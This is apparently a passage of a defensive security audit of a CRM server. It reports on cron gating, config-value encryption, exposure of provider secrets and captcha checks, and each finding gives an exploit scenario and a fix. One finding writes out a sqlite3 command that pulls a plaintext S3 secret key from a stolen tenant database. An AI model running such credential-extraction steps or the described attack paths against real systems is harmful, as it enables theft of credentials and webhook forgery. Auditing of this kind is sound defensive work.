### INFO dunning POST /run-now correctly gated behind admin role + rate limiter

**Where:** `packages/server/src/routes/dunning.routes.ts:223–275`

**What:**
`POST /api/v1/dunning/run-now` checks `req.user?.role !== 'admin'` before calling `runDunningOnce`, and also enforces a 15-minute global cooldown via `consumeWindowRate`. The route is mounted behind `authMiddleware`. A non-admin authenticated user cannot trigger the dunning run. Rate limiting prevents double-click double-dispatch.

**Code:**
```typescript
router.post('/run-now', asyncHandler(async (req: Request, res: Response) => {
  if (req.user?.role !== 'admin') {
    throw new AppError('Admin only', 403);
  }
  const rateResult = consumeWindowRate(req.db, DUNNING_RUN_CATEGORY, 'global', 1, 15 * 60 * 1000);
  if (!rateResult.allowed) { /* 429 */ }
  // ...
  const summary = await runDunningOnce(db);
```

**Exploit:**
No bypass identified. Route is correctly guarded.

**Fix:**
No action required. Consider also adding an audit-log entry on the 429 path (currently only the 200 path is audited) so operators can detect repeated manual-trigger attempts.

---

### INFO Cron idempotency mechanisms are sound across all focus files

**Where:** Multiple files — see below.

**What:**
All focus-file crons use appropriate idempotency guards:
- `recurringInvoicesCron.ts`: atomic `UPDATE … WHERE next_run_at <= now()` inside a transaction; `changes === 0` skips duplicate.
- `dunningScheduler.ts`: `UNIQUE(invoice_id, sequence_id, step_index)` on `dunning_runs` prevents double-dispatch even if the cron fires twice.
- `slaBreachCron.ts`: `UPDATE … WHERE sla_breached = 0` (idempotent flip) + `INSERT OR IGNORE` on `sla_breach_log` for first-response entries.
- `dataExportScheduleCron.ts`: atomic claim `UPDATE … WHERE next_run_at <= now()` with `changes === 0` skip.
- `giftCardExpirySweep.ts`: `UPDATE … WHERE status = 'active' AND expires_at <= now()` is inherently idempotent.
- `retentionSweeper.ts`: `DELETE WHERE date < cutoff` is idempotent.
- `receiptOcrCron.ts`: status-machine (`pending → processing → done/failed`) with stale-cleanup pass prevents infinite retry.

**Exploit:**
No double-execution vulnerability found in any focus file.

**Fix:**
No action required.

---

### INFO No unguarded HTTP trigger for any cron task found

**Where:** All focus files + `index.ts` cron wiring.

**What:**
The only HTTP endpoint that manually triggers a cron task is `POST /api/v1/dunning/run-now`, which is behind `authMiddleware` and an admin-role check (verified above). All other cron services (`startRecurringInvoicesCron`, `startSlaBreachCron`, `startDataExportScheduleCron`, `startReceiptOcrCron`, `runReportEmailerTick`, retention sweep, gift-card expiry, health-score recompute, storage recalc) are triggered only by `setInterval` / `trackInterval` — no HTTP trigger, no internal endpoint. No cron is mounted on the public router without authentication.

**Exploit:**
No unauthenticated HTTP cron trigger found.

**Fix:**
No action required.


---

# S32-config-encryption

# S32 — Configuration Encryption Audit

## Scope

- `packages/server/src/utils/configEncryption.ts`
- All callers of `encryptConfigValue` / `decryptConfigValue` / `getConfigValue` / `setConfigValue`
- TOTP encrypt/decrypt in `auth.routes.ts`, `settings.routes.ts`, `super-admin.routes.ts`, `middleware/stepUpTotp.ts`
- Settings routes: `settings.routes.ts`, `settingsExport.routes.ts`
- Services: `blockchyp.ts`, `email.ts`, `webhooks.ts`
- Migrations: `019_totp_2fa.sql`; master schema in `db/master-connection.ts`

---

### [CRITICAL] Wrong column names in super-admin step-up TOTP middleware crashes 7 protected endpoints

**Where:** `packages/server/src/middleware/stepUpTotp.ts:362`

**What:**
`requireStepUpTotpSuperAdmin` issues `SELECT id, email, totp_secret, totp_iv, totp_tag FROM super_admins WHERE id = ?` (line 362), but the `super_admins` schema (defined in `db/master-connection.ts:70-72`) uses `totp_secret_enc`, `totp_secret_iv`, `totp_secret_tag`. `better-sqlite3` calls `.prepare()` eagerly: selecting non-existent columns throws `no such column: totp_secret` synchronously. Because the async middleware has no try/catch, this propagates as an unhandled rejected promise → 500 for every request hitting these endpoints.

**Code:**
```typescript
// middleware/stepUpTotp.ts:361-364 — wrong column names
const dbAdmin = masterDb
  .prepare('SELECT id, email, totp_secret, totp_iv, totp_tag FROM super_admins WHERE id = ? AND is_active = 1')
  .get(superAdmin.superAdminId) as
  | { id: number; email: string | null; totp_secret: string | null; totp_iv: string | null; totp_tag: string | null }
  | undefined;

// db/master-connection.ts:70-72 — actual schema
totp_secret_enc TEXT,
totp_secret_iv  TEXT,
totp_secret_tag TEXT,
```

**Exploit:**
All 7 endpoints guarded by `requireStepUpTotpSuperAdmin` — `/rotate-jwt-secret`, `/tenants/:slug` (PUT/suspend/repair/activate/DELETE), `/force-disable-2fa` — return HTTP 500 to any caller, making them permanently inaccessible in production. A service operator cannot suspend a compromised tenant, delete a tenant, or rotate the JWT secret via the API; disaster-recovery operations require direct DB access.

**Fix:**
Change the SELECT in `stepUpTotp.ts:362` to `SELECT id, email, totp_secret_enc, totp_secret_iv, totp_secret_tag FROM super_admins ...` and update the TypeScript cast and references at lines 364 and 373/409 accordingly. Match `super-admin.routes.ts:475-478` which already uses the correct names.

---

### [HIGH] TOTP v3 key missing in settings.routes.ts — admin TOTP step-up silently blocked

**Where:** `packages/server/src/routes/settings.routes.ts:50-70` and `packages/server/src/routes/auth.routes.ts:112-124`

**What:**
`auth.routes.ts` (the canonical TOTP encrypt path) was upgraded to key version 3 (HKDF-derived via `hkdfKey([jwtSecret, superAdminSecret], 'bizarre-totp-salt-v3', 'totp-key-v3')`). All newly enrolled or re-enrolled TOTP secrets are now written as `v3:iv:tag:data`. However, `settings.routes.ts` maintains a separate `TOTP_DECRYPT_KEYS` map at lines 50-53 that only defines keys 1 and 2 — v3 is absent. When a TOTP secret with prefix `v3` reaches `decryptTotpSecret`, line 66 (`TOTP_DECRYPT_KEYS[3]`) returns `undefined` and line 67 throws `Error('Unknown encryption key version: 3')`.

**Code:**
```typescript
// settings.routes.ts:50-53 — v3 key is missing
const TOTP_DECRYPT_KEYS: Record<number, Buffer> = {
  1: crypto.createHash('sha256').update(config.jwtSecret + ':totp:v1').digest(),
  2: crypto.createHash('sha256').update(config.jwtSecret + ':totp-encryption:v2:' + config.superAdminSecret).digest(),
  // v3 absent
};

// settings.routes.ts:1136-1141 — error caught, totpValid stays false
try {
  const secret = decryptTotpSecret(caller.totp_secret); // throws for v3
  totpValid = Boolean(verifySync({ token: admin_totp_code, secret }));
} catch (err) {
  logger.error('TOTP verification failed during sensitive user update', { err, targetUserId });
  totpValid = false; // always false for v3 secrets
}
```

**Exploit:**
An authenticated admin whose TOTP secret is v3-encrypted (any account enrolled/re-enrolled after the v3 migration in `auth.routes.ts`) can never pass the `admin_totp_code` step-up check in `PUT /settings/users/:id`. Sensitive user-record mutations (password changes, role promotion, 2FA reset) are permanently blocked for those admins, even with a correct 6-digit code. An attacker who knows this can prevent legitimate admins from locking a compromised user account.

**Fix:**
Add the v3 key derivation to `settings.routes.ts`'s `TOTP_DECRYPT_KEYS` map, using the same `hkdfKey` helper as `auth.routes.ts`. Better long-term: extract the TOTP key table and `decryptSecret` function into a shared `utils/totpEncryption.ts` module so there is exactly one definition.

---

### [MEDIUM] S3 backup credentials stored in plaintext — missing from ENCRYPTED_CONFIG_KEYS

**Where:** `packages/server/src/utils/configEncryption.ts:35-46` and `packages/server/src/routes/settings.routes.ts:308,323`

**What:**
`backup_s3_access_key` and `backup_s3_secret_key` are listed in `SENSITIVE_CONFIG_KEYS` (hidden from non-admins on GET `/config`) and in `ALLOWED_CONFIG_KEYS`, but they are **not** in `ENCRYPTED_CONFIG_KEYS`. The store-write path at `settings.routes.ts:519` checks `ENCRYPTED_CONFIG_KEYS.has(key)` before encrypting — these two keys fail that check and are written as UTF-8 plaintext in the tenant SQLite DB. Any tenant DB exposure (file-system leak, SQLite dump, backup theft before encryption) reveals cloud storage credentials in cleartext.

**Code:**
```typescript
// configEncryption.ts:35-46 — S3 keys absent
export const ENCRYPTED_CONFIG_KEYS = new Set([
  'blockchyp_api_key', 'blockchyp_bearer_token', 'blockchyp_signing_key',
  'sms_twilio_auth_token', 'sms_telnyx_api_key', 'sms_bandwidth_password',
  'sms_plivo_auth_token', 'sms_vonage_api_secret',
  'smtp_pass', 'tcx_password',
  // 'backup_s3_access_key', 'backup_s3_secret_key' ← MISSING
]);
```

**Exploit:**
If an attacker exfiltrates a tenant's SQLite file (e.g., through a path-traversal or a misrouted backup), `backup_s3_access_key` and `backup_s3_secret_key` are immediately readable; the attacker can access the tenant's S3 bucket, exfiltrate or destroy all backup archives, and pivot to any other services sharing those AWS credentials.

**Fix:**
Add `'backup_s3_access_key'` and `'backup_s3_secret_key'` to `ENCRYPTED_CONFIG_KEYS` in `configEncryption.ts`. Read sites that currently call `getConfigValue(db, 'backup_s3_access_key')` will auto-decrypt; read sites that query raw SQL must be updated to call `decryptConfigValue` on the value.

---

### [MEDIUM] webhook_secret stored plaintext despite claim of configEncryption

**Where:** `packages/server/src/services/webhooks.ts:248-267`

**What:**
The file's JSDoc (line 8) states the `webhook_secret` is "stored encrypted via configEncryption," but the implementation in `getOrCreateWebhookSecret` issues bare `INSERT OR IGNORE INTO store_config (key, value) VALUES ('webhook_secret', ?)` and `SELECT value FROM store_config WHERE key = 'webhook_secret'` with no call to `encryptConfigValue` or `decryptConfigValue`. The `webhook_secret` key is also absent from `ENCRYPTED_CONFIG_KEYS`. The secret is thus stored as 64 hex characters of plaintext.

**Code:**
```typescript
// webhooks.ts:259-266 — no encryption
const candidate = crypto.randomBytes(32).toString('hex');
db.prepare(
  "INSERT OR IGNORE INTO store_config (key, value) VALUES ('webhook_secret', ?)"
).run(candidate);       // ← plain hex, not encryptConfigValue(candidate)
const row = db
  .prepare("SELECT value FROM store_config WHERE key = 'webhook_secret'")
  .get() as { value?: string } | undefined;
return row?.value || candidate;  // ← plain hex returned directly
```

**Exploit:**
An attacker who reads the tenant DB (SQLite file exfil, backup, or SQLi that can dump `store_config`) gets the HMAC-SHA256 signing key for all outbound webhooks. They can forge valid webhook POST bodies that any integrated third-party endpoint will accept as genuine BizarreCRM events.

**Fix:**
Wrap `candidate` in `encryptConfigValue(candidate)` on write and `decryptConfigValue(row.value)` on read. Add `'webhook_secret'` to `ENCRYPTED_CONFIG_KEYS` so the standard `getConfigValue` / `setConfigValue` helpers handle it automatically.

---

### [MEDIUM] PUT /store response leaks raw ciphertext for encrypted config keys

**Where:** `packages/server/src/routes/settings.routes.ts:594-597`

**What:**
`PUT /store` writes encrypted values to the DB correctly (line 582 encrypts if key is in `ENCRYPTED_CONFIG_KEYS`), but the response body at lines 594-597 performs a raw `SELECT * FROM store_config` and puts every row's `value` field directly into the JSON response without decryption. Admin clients therefore receive `enc:v1:<hex_iv>:<hex_tag>:<hex_ct>` blobs for `tcx_password`, `smtp_pass`, and any other encrypted key that was previously stored. `GET /store` (line 556-567) and `GET /config` (line 391-406) do decrypt; only the `PUT /store` success response is missing the decryption loop.

**Code:**
```typescript
// settings.routes.ts:594-597 — missing decryption in response
const rows = await adb.all<any>('SELECT key, value FROM store_config');
const cfg: Record<string, string> = {};
for (const row of rows) cfg[row.key] = row.value;  // ← raw ciphertext!
res.json({ success: true, data: cfg });
```

**Exploit:**
A frontend that reads the PUT response to refresh its settings state will display or log `enc:v1:...` ciphertext blobs to the admin UI or browser console, confirming the encryption scheme (AES-256-GCM, versioned format) and providing ciphertexts that could be used in key-recovery timing attacks if any decryption oracle is later found.

**Fix:**
Mirror the decryption loop from `GET /store` (lines 563-565): `cfg[row.key] = (isAdmin && ENCRYPTED_CONFIG_KEYS.has(row.key)) ? decryptConfigValue(row.value) : row.value;` in the PUT response.

---

### [INFO] HMAC-wrapping of HKDF output in configEncryption key derivation adds no security

**Where:** `packages/server/src/utils/configEncryption.ts:30`

**What:**
The AES key for config-value encryption is derived as `HMAC-SHA256(key='bizarre-crm:config-secrets:v1', msg=config.configEncryptionKey)`. `configEncryptionKey` is itself either a 32-byte random hex env var (production) or `HKDF(JWT_SECRET, 'config-enc')` (dev). Wrapping an already-keyed HKDF output with a second HMAC keyed by a public static string provides no additional entropy or domain separation; it merely transforms the key deterministically. If `CONFIG_ENCRYPTION_KEY` is a full 32-byte random, the HMAC step is redundant. In dev the chain is `HKDF(JWT_SECRET, 'config-enc') → HMAC(static_label, hkdf_output)`, which is equivalent in practice to `HKDF(JWT_SECRET, 'config-enc')` alone.

**Code:**
```typescript
// configEncryption.ts:30
1: crypto.createHmac('sha256', 'bizarre-crm:config-secrets:v1').update(config.configEncryptionKey).digest(),
```

**Exploit:**
No direct exploitability; security depends entirely on `configEncryptionKey` entropy, which is fine when `CONFIG_ENCRYPTION_KEY` is set. The HMAC step misleads reviewers into thinking an independent salt is involved.

**Fix:**
Use the HKDF output directly as the AES key (after hex-decoding the 64-char hex string to 32 bytes), or derive the AES key via `hkdfSync` with `configEncryptionKey` as IKM and a domain-separated info string. Remove the HMAC-wrapping layer.

---

## Summary

| SEV | Count |
|---|---|
| CRITICAL | 1 |
| HIGH | 1 |
| MEDIUM | 3 |
| INFO | 1 |

Most severe: **CRITICAL** — `requireStepUpTotpSuperAdmin` selects wrong column names (`totp_secret`/`totp_iv`/`totp_tag` vs actual `totp_secret_enc`/`totp_secret_iv`/`totp_secret_tag`), crashing all 7 super-admin destructive endpoints with HTTP 500.


---

# S33-secrets-exposure

# S33 — Provider Credentials in DB and Exposure on Read Endpoints

---

### HIGH — webhook_secret returned in plaintext to all authenticated users

**Where:** `packages/server/src/routes/settings.routes.ts:391-406`; secret created in `packages/server/src/services/webhooks.ts:248-267`

**What:**
`GET /settings/config` reads every row from `store_config` and filters out only those keys listed in `SENSITIVE_CONFIG_KEYS`. The per-tenant HMAC signing secret (`webhook_secret`) is auto-generated by `getOrCreateWebhookSecret()` and written to `store_config` but is **absent from `SENSITIVE_CONFIG_KEYS`**, so it is returned to every authenticated user regardless of role. A technician or cashier account can read the secret by calling `GET /api/v1/settings/config`.

**Code:**
```typescript
// settings.routes.ts:391
router.get('/config', async (req, res) => {
  const rows = await adb.all<any>('SELECT key, value FROM store_config');
  const isAdmin = req.user?.role != null && SETTINGS_ADMIN_ROLES.has(req.user.role.toLowerCase());
  const cfg: Record<string, string> = {};
  for (const row of rows) {
    if (!isAdmin && SENSITIVE_CONFIG_KEYS.has(row.key)) continue; // webhook_secret NOT here
    cfg[row.key] = ...;
  }
  res.json({ success: true, data: cfg });
});

// SENSITIVE_CONFIG_KEYS (line 316) does NOT contain 'webhook_secret'
// webhooks.ts: INSERT OR IGNORE INTO store_config (key, value) VALUES ('webhook_secret', ?)
```

**Exploit:**
Any authenticated staff user (technician, cashier, receptionist) sends `GET /api/v1/settings/config` and reads the `webhook_secret` field. They can then compute valid HMAC signatures (`sha256=<hmac>`) and forge or replay outbound webhook deliveries to the customer's configured endpoint, injecting fake `ticket_created` / `invoice_paid` events into any downstream system integrated with the CRM.

**Fix:**
Add `'webhook_secret'` to `SENSITIVE_CONFIG_KEYS` in `settings.routes.ts`. Additionally add it to `ENCRYPTED_CONFIG_KEYS` in `configEncryption.ts` so it is AES-GCM encrypted at rest. The UI should never display the raw secret; offer a "rotate" action instead.

---

### HIGH — GET /config and PUT /config responses echo decrypted provider secrets to admin in plaintext

**Where:** `packages/server/src/routes/settings.routes.ts:398-405` (GET /config), `packages/server/src/routes/settings.routes.ts:545-551` (PUT /config response)

**What:**
Both `GET /settings/config` and the response of `PUT /settings/config` call `decryptConfigValue()` for every key in `ENCRYPTED_CONFIG_KEYS` and return the plaintext value. This means the Twilio Auth Token, BlockChyp API/Bearer/Signing keys, Telnyx API key, SMTP password, Bandwidth password, Plivo Auth Token, Vonage API secret, and 3CX password are returned to the browser in every page load of the settings panel. The secrets travel across the wire in every API response, are stored in browser memory, appear in browser DevTools network logs, and in any reverse proxy access logs, dramatically widening the blast radius beyond the encrypted SQLite DB.

**Code:**
```typescript
// GET /config line 398-401 — admin receives all decrypted secrets
cfg[row.key] = (isAdmin && ENCRYPTED_CONFIG_KEYS.has(row.key))
  ? decryptConfigValue(row.value)  // plaintext secret returned to browser
  : row.value;

// PUT /config line 548-550 — same after every save
result[row.key] = ENCRYPTED_CONFIG_KEYS.has(row.key)
  ? decryptConfigValue(row.value)  // plaintext secret returned again
  : row.value;
```

**Exploit:**
An admin account is compromised (phishing, XSS, session steal). The attacker opens browser DevTools → Network → `/api/v1/settings/config` response and harvests all 8+ provider credentials (Twilio account SID + auth token, BlockChyp keys, SMTP password, etc.) in a single API call, without needing access to the DB file. A MITM on HTTP or proxy with logging access obtains the same data passively.

**Fix:**
Return a masked placeholder (e.g. `"***"`) for all keys in `ENCRYPTED_CONFIG_KEYS` on GET. For PUT (save), do not echo the decrypted value in the response — return the masked placeholder. Implement a separate `GET /settings/reveal-secret?key=<k>` endpoint that requires fresh TOTP step-up and returns only the one requested value. This bounds the exposure window to explicit operator actions.

---

### MEDIUM — backup_s3_access_key and backup_s3_secret_key stored plaintext in SQLite DB (not AES-encrypted)

**Where:** `packages/server/src/utils/configEncryption.ts:35-46` (ENCRYPTED_CONFIG_KEYS missing backup S3 keys); `packages/server/src/routes/settings.routes.ts:322-323` (SENSITIVE_CONFIG_KEYS present but no encryption)

**What:**
`SENSITIVE_CONFIG_KEYS` correctly hides `backup_s3_access_key` and `backup_s3_secret_key` from non-admin API responses, but neither key appears in `ENCRYPTED_CONFIG_KEYS`. Therefore they are stored as raw plaintext strings in the tenant's SQLite file (`store_config`). Every other high-value secret (Twilio auth token, BlockChyp keys, SMTP pass) is AES-256-GCM encrypted at rest, but S3 credentials receive only access-control protection, not encryption-at-rest protection. A copy of the DB file — from a backup, a misconfigured file-serve, or a path traversal — exposes the cloud object-storage credentials directly.

**Code:**
```typescript
// configEncryption.ts:35 — backup S3 keys ABSENT from ENCRYPTED_CONFIG_KEYS
export const ENCRYPTED_CONFIG_KEYS = new Set([
  'blockchyp_api_key', 'blockchyp_bearer_token', 'blockchyp_signing_key',
  'sms_twilio_auth_token', 'sms_telnyx_api_key', 'sms_bandwidth_password',
  'sms_plivo_auth_token', 'sms_vonage_api_secret',
  'smtp_pass', 'tcx_password',
  // backup_s3_access_key and backup_s3_secret_key NOT here ← gap
]);
```

**Exploit:**
An attacker who obtains the SQLite tenant DB (via backup theft, LFI, or file-share misconfiguration) runs `sqlite3 tenant.db "SELECT value FROM store_config WHERE key='backup_s3_secret_key'"` and receives the plaintext AWS/S3 secret key. With it, they access or exfiltrate the tenant's backup bucket.

**Fix:**
Add `'backup_s3_access_key'` and `'backup_s3_secret_key'` to `ENCRYPTED_CONFIG_KEYS` in `configEncryption.ts`. The import/PUT logic already calls `encryptConfigValue()` for any key in that set, so the only change needed is the set membership.

---

### MEDIUM — PUT /store response returns all store_config rows unfiltered including raw encrypted ciphertext blobs

**Where:** `packages/server/src/routes/settings.routes.ts:570-598` (PUT /store handler, line 594-597 response)

**What:**
`PUT /settings/store` is admin-only and updates a small subset of config keys, but its response (lines 594-597) reads **all** `store_config` rows and returns them without any `SENSITIVE_CONFIG_KEYS` or `ENCRYPTED_CONFIG_KEYS` filtering. Encrypted values appear as `enc:v1:<iv>:<tag>:<ciphertext>` blobs, and unencrypted sensitive fields like `backup_s3_access_key` / `backup_s3_secret_key` appear as plaintext. An admin who calls `PUT /store` receives a superset of what `GET /config` would return for a non-admin, since the SENSITIVE filter is skipped entirely.

**Code:**
```typescript
// PUT /store response, line 594-597 — NO filtering applied
const rows = await adb.all<any>('SELECT key, value FROM store_config');
const cfg: Record<string, string> = {};
for (const row of rows) cfg[row.key] = row.value; // returns ALL rows, no masking
res.json({ success: true, data: cfg });
```

**Exploit:**
An admin saves a store setting (e.g. timezone) and the response body inadvertently includes `backup_s3_access_key` in plaintext and `sms_twilio_auth_token` as the raw ciphertext blob. While the admin is already privileged, this is still a data-surface reduction violation: the backup S3 key should be access-controlled (masked) unless explicitly requested.

**Fix:**
Replace the unfiltered response loop with the same logic used in `GET /config`: skip `SENSITIVE_CONFIG_KEYS` for non-admin (though `PUT /store` is admin-only, apply masking consistently), and return the masked placeholder for `ENCRYPTED_CONFIG_KEYS` fields. Alternatively, return only the keys that were actually written/changed.

---

### LOW — Twilio account SID, Vonage API key, Bandwidth account/username, Plivo auth ID exposed to non-admin users via GET /config

**Where:** `packages/server/src/routes/settings.routes.ts:316-324` (SENSITIVE_CONFIG_KEYS), `packages/server/src/routes/settings.routes.ts:193-196` (ALLOWED_CONFIG_KEYS containing these fields)

**What:**
The following provider-identifying credentials are stored as plaintext and are NOT in `SENSITIVE_CONFIG_KEYS`, so they are returned to every authenticated user via `GET /settings/config` and `GET /settings/store`: `sms_twilio_account_sid`, `sms_vonage_api_key` (API key, not secret), `sms_bandwidth_account_id`, `sms_bandwidth_username`, `sms_plivo_auth_id`, `sms_telnyx_public_key`, `tcx_username`. While none of these alone allow account takeover, they are enumeration data for targeted phishing (provider-targeted social engineering) and permit a tech with the account SID + any auth token leak to construct valid Twilio Basic Auth headers.

**Code:**
```typescript
// SENSITIVE_CONFIG_KEYS (line 316) — account identifiers absent:
const SENSITIVE_CONFIG_KEYS = new Set([
  'tcx_password', 'smtp_pass', 'blockchyp_api_key', ...
  // sms_twilio_account_sid NOT listed → returned to all authenticated users
  // sms_vonage_api_key NOT listed → returned to all authenticated users
]);
```

**Exploit:**
A compromised low-privilege employee account calls `GET /api/v1/settings/config` and harvests the Twilio Account SID and Vonage API key. Combined with a separately leaked auth secret (e.g., from another vector), these form a working credential pair. The account SID alone also allows social-engineering Twilio support.

**Fix:**
Add `sms_twilio_account_sid`, `sms_vonage_api_key`, `sms_bandwidth_account_id`, `sms_bandwidth_username`, `sms_plivo_auth_id`, and `tcx_username` to `SENSITIVE_CONFIG_KEYS`. They are provider-specific identifiers that non-admin staff have no operational need to read.

---

### LOW — Settings export (GET /export) produces portable plaintext dump of all provider secrets without post-download revocation

**Where:** `packages/server/src/routes/settings.routes.ts:2018-2031`

**What:**
`GET /settings/export` is gated behind `adminOnly` + `requireStepUpTotp`, which is correct. However, the exported JSON file contains every key in `ENCRYPTED_CONFIG_KEYS` decrypted to plaintext (Twilio token, BlockChyp keys, SMTP password, etc.) plus all non-encrypted secrets (backup S3 keys in plaintext). Once exported, the file is indistinguishable from a credential dump. There is no audit log entry for what was exported, no file TTL, and no instruction to re-rotate secrets post-export. An admin under duress or a compromised TOTP device produces a portable, unprotected credential archive.

**Code:**
```typescript
// line 2022-2026 — all secrets decrypted into a single JSON blob
for (const row of rows) {
  configData[row.key] = ENCRYPTED_CONFIG_KEYS.has(row.key)
    ? decryptConfigValue(row.value)  // plaintext credential in export
    : row.value;
}
res.json({ success: true, data: configData });
```

**Exploit:**
Attacker compromises an admin account with TOTP (e.g. via account recovery flaw or shoulder-surfing a one-time code) and triggers the export. The downloaded `bizarrecrm-settings.json` contains all provider API keys as plaintext. The attacker pivots to the SMS provider, email server, and payment terminal immediately.

**Fix:**
(1) Emit an `audit` log event for every export with the operator's user ID and IP. (2) Mask all `ENCRYPTED_CONFIG_KEYS` fields in the export JSON with `"REDACTED"` and add a `_export_note` field instructing operators to re-enter credentials when importing. Secrets should be re-entered at import time, not transferred. (3) Consider requiring a second admin to confirm the export (four-eyes principle) for the highest-value tenants.

---

### INFO — Console SMS provider bypasses webhook signature gate on inbound SMS/voice webhooks

**Where:** `packages/server/src/routes/sms.routes.ts:917`; `packages/server/src/providers/sms/console.ts`

**What:**
The webhook signature gate uses `if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req))` — if `verifyWebhookSignature` is `undefined` (as it is on `ConsoleProvider`), the entire check is skipped and any HTTP POST to the inbound webhook URL is accepted. When the console provider is active (dev or misconfigured), unauthenticated actors can POST to the webhook endpoint without signature validation. In practice, `ConsoleProvider.parseInboundWebhook()` always returns `null`, so no message is stored, limiting the immediate impact.

**Code:**
```typescript
// sms.routes.ts:917 — falsy short-circuit skips gate when method is undefined
if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req)) {
  res.status(403).json({ ... });
  return;
}
// ConsoleProvider has no verifyWebhookSignature — gate is silently skipped
```

**Exploit:**
If a production deployment accidentally uses `sms_provider_type=console` (e.g. after a misconfiguration), any attacker can POST to `/api/v1/sms/inbound` without credentials. Current ConsoleProvider returns null from parseInboundWebhook so no message is persisted, but if ConsoleProvider were ever extended with parsing logic, this gap would allow unauthenticated message injection.

**Fix:**
Change the gate pattern to `fail-closed`: if `provider.verifyWebhookSignature` is `undefined`, reject the request with 403 in production (`NODE_ENV === 'production'`). Add an explicit `verifyWebhookSignature(req) { return false; }` to `ConsoleProvider` that rejects all webhooks — the console provider is dev-only and should never receive real provider callbacks.

---


---

# S34-captcha

# S34 — hCaptcha / reCAPTCHA Integration Findings

Scope: `packages/server/src/utils/hcaptcha.ts`, `packages/server/src/routes/signup.routes.ts`, `packages/server/src/routes/auth.routes.ts`, `packages/server/src/routes/bookingPublic.routes.ts`, `packages/server/src/routes/leads.routes.ts`
Reviewed: 2026-05-05

---

### [HIGH] `skipEmailVerification = true` hardcoded — email ownership never verified in any environment including production

**Where:** `packages/server/src/routes/signup.routes.ts:618`

**What:**
The constant `skipEmailVerification` is hardcoded to `true` (line 618) with no environment-variable guard. The comment at line 614 shows the intended expression was `process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production'`, but SMTP issues caused a blanket disable. As a result, in every environment — including production multi-tenant with `NODE_ENV=production` — POST /signup immediately calls `provisionTenant()` without ever sending or verifying a link. Any email address (including addresses the attacker does not own) can be used to register a tenant. The response body still says "dev mode — email verification bypassed" even in production.

**Code:**
```typescript
// TEMP-NO-EMAIL-VERIF (2026-04-24): email verification fully disabled
// …restore the SEC-H94 / BH-0002 gate by flipping the constant back…
//   const skipEmailVerification = process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production';
// While this is `true`, /signup provisions tenants synchronously without
// proving control of the email
const skipEmailVerification = true;
if (skipEmailVerification) {
    logger.warn('signup: TEMP-NO-EMAIL-VERIF — email verification disabled', ...);
    const result = await provisionTenant({ … });
```

**Exploit:**
An attacker with a valid hCaptcha token submits `POST /signup` with `admin_email=victim@company.com`. Without email verification a real tenant is immediately provisioned under the victim's email address, the attacker receives authentication tokens in the 201 response, and the victim gets no notification. This enables brand-squatting and creates orphaned tenants under uncontrolled email addresses at scale.

**Fix:**
Restore the conditional: `const skipEmailVerification = process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production';`. Once SMTP is healthy, remove the env-var escape hatch entirely so this path requires email verification unconditionally. Add a production boot-time fatal if `SKIP_EMAIL_VERIFICATION=1` and `NODE_ENV=production` co-exist.

---

### [MEDIUM] Captcha hostname not asserted — tokens solved on any registered hCaptcha site are accepted

**Where:** `packages/server/src/utils/hcaptcha.ts:104–107` and `packages/server/src/routes/signup.routes.ts:336–337`

**What:**
Both captcha verifiers parse `result.hostname` from the hCaptcha `/siteverify` response but only log it; they never compare it against the expected domain (e.g., `config.baseDomain`). The hCaptcha API returns `hostname` to identify which site the token was generated on. Without asserting this field, a token solved on any other hCaptcha-enabled property — including a site controlled by the attacker — can be replayed against the signup or login endpoint, provided the attacker holds a valid secret/sitekey pair recognised by hCaptcha's backend.

**Code:**
```typescript
// hcaptcha.ts:104-114
const result = await response.json() as HCaptchaApiResponse;
if (result.success === true) {
  return { ok: true };  // hostname never checked
}
logger.warn('hCaptcha verification rejected token', {
  remoteIp,
  hostname: result.hostname,  // logged only
  errors: result['error-codes'] ?? [],
});
```

**Exploit:**
An attacker registers their own domain with the same hCaptcha account or obtains a token from a low-security hCaptcha integration, then uses that token (still within its validity window) against `POST /signup`. The server accepts it because `result.success === true` without verifying `result.hostname === config.baseDomain`.

**Fix:**
After a successful `result.success === true`, assert `result.hostname === config.baseDomain` (or a configured allowlist). Return `{ ok: false, reason: 'Captcha hostname mismatch' }` if the check fails. Expose `config.hCaptchaHostname` to make the expected domain independently configurable from `baseDomain`.

---

### [MEDIUM] Captcha token transmitted in GET query string for `/check-slug` — logged in access logs and CDN caches

**Where:** `packages/server/src/routes/signup.routes.ts:963`

**What:**
The `/check-slug/:slug` endpoint accepts the hCaptcha response token via the `?captcha=<token>` query parameter on a GET request. Bearer tokens in URLs are captured verbatim by every layer in the request path: server access logs, reverse proxy logs, CDN edge logs, browser history, and `Referer` headers on subsequent navigations. A replayed token (before hCaptcha marks it consumed) could be extracted from logs and submitted against a more sensitive endpoint. Additionally, the short validity window (~2 minutes) means an adversary with log access has a brief but real replay window.

**Code:**
```typescript
// signup.routes.ts:963
const captchaToken = req.query.captcha;   // token in URL query string
const captchaResult = await verifyCaptchaToken(captchaToken, ip);
```

**Exploit:**
Server access logs contain entries like `GET /api/v1/signup/check-slug/myshop?captcha=P1_ey...`. An attacker with read access to the web server logs (common in shared hosting, misconfigured S3 log buckets, or insider threat) extracts the token and replays it against `POST /signup` before hCaptcha's server-side consumption marks it used.

**Fix:**
Change `/check-slug` to accept POST with the captcha token in the JSON body, or pass the token via a custom request header (e.g., `X-Captcha-Token`). Neither headers nor POST bodies appear in standard access-log formats.

---

### [LOW] Forgot-password captcha gate is unreachable dead code — rate-limit threshold (3) is lower than captcha threshold (5)

**Where:** `packages/server/src/routes/auth.routes.ts:1651` and `1665–1676`

**What:**
`POST /forgot-password` applies a hard rate-limit of 3 attempts per hour per IP (`checkWindowRate(db, 'forgot_password', ip, 3, 3600_000)` at line 1651). The captcha gate fires when `countRateLimitAttempts(db, 'forgot_password', ip) >= CAPTCHA_FAILURE_THRESHOLD` where `CAPTCHA_FAILURE_THRESHOLD = 5`. Because `checkWindowRate` blocks (returns 429) once the count reaches 3, the count can never reach 5 during an active window — the captcha block at line 1666 is therefore never executed. The intent was to add friction before the hard block, but the threshold ordering inverts the desired behavior.

**Code:**
```typescript
// Blocks at count >= 3:
if (!checkWindowRate(db, 'forgot_password', ip, 3, 3600_000)) {
  res.status(429).json({ ... }); return;
}
// Dead code — count is always < 3 when this line executes:
